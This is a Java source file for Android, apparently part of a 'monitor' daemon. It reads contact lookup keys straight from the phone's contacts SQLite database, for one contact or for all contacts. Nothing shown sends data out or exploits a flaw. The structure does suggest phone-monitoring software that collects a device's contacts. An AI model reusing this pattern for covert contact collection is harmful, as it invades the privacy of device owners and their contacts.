package com.vvt.processaddressbookmanager.monitor;

import java.util.ArrayList;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.provider.BaseColumns;
import android.provider.ContactsContract.Contacts;

import com.vvt.daemon_addressbook_manager.Customization;
import com.vvt.logger.FxLog;


public class PhoneContacts {
	private final static String TAG = "PhoneContacts";
	
	public final static String CONTACTS_TABLE_NAME = "contacts";
	public final static String DATA_TABLE_NAME = "data";
	
    /**
     * Use by VCardProvider.
     * 
     * @param context
     * @param id
     * @return
     */
	public static String getLookupKey(Context context, long id) {
		
		SQLiteDatabase db = AddressBookHelper.getReadableDatabase();
		String lookupKey = "";
		
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(Customization.VERBOSE) FxLog.v(TAG, "lookupKeys # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return lookupKey;
		}
		
		Cursor cursor = null;
			
		try {
			String[] columns = new String[] { Contacts.LOOKUP_KEY };
			String selection = BaseColumns._ID + "=?";
			String[] selectionArgs = new String[] { String.valueOf(id) };
			cursor = db.query(CONTACTS_TABLE_NAME, columns, selection, selectionArgs, null, null, null, null);
			
			if (cursor != null) {
				cursor.moveToFirst();
				lookupKey = cursor.getString(0);
				cursor.close();
			}
		}
		catch (SQLiteException e) {
			if(Customization.ERROR) FxLog.e(TAG, String.format("getLookupKeys # error: %s", e.toString()));
		}
		finally {
			if(cursor != null) cursor.close();
			db.close();
		}
		 
		return lookupKey;
	}

	public static ArrayList<String> getLookupKeys() {
		if(Customization.VERBOSE) FxLog.v(TAG, "lookupKeys # START ...");
		
		ArrayList<String> lookupKeys = new ArrayList<String>();

		SQLiteDatabase db = AddressBookHelper.getReadableDatabase();
		
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			FxLog.v(TAG, "lookupKeys # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return lookupKeys;
		}
		
		Cursor cursor = null;
		
		try {
			String sql = String.format("SELECT %s FROM %s",  Contacts.LOOKUP_KEY, CONTACTS_TABLE_NAME);
			cursor = db.rawQuery(sql, null);
			
			if (cursor != null) {
				if (cursor.moveToFirst()) {
					do {
						String lookupKey = cursor.getString(0);
						lookupKeys.add(lookupKey);
					} while (cursor.moveToNext());
				}

				cursor.close();
			}
		}
		catch (SQLiteException e) {
			FxLog.e(TAG, String.format("getLookupKeys # error: %s", e.toString()));
		}
		finally {
			if(cursor != null) cursor.close();
			db.close();
		}
		
		if(Customization.VERBOSE) FxLog.v(TAG, "lookupKeys count: " + lookupKeys.size());
		if(Customization.VERBOSE) FxLog.v(TAG, "lookupKeys # EXIT ...");
		return lookupKeys;
	}

}
